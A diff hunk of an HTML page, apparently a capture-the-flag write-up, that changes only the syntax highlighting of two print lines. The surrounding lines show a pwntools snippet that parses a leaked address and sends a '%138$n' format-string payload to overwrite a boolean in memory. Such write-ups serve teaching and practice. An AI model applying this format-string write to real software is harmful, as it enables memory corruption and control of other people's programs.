@@ -319,10 +319,10 @@ in the payload we have this value before <code>n</code>.</p>
 <span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
 <span class="n">address</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">'__'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address: </span><span class="si">{address}</span><span class="s2">"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address: </span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">addr</span> <span class="o">-=</span> <span class="mi">4</span>
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address of boolean: {hex(addr)}"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"address of boolean: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'AAAAAAAA-%138$n-'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
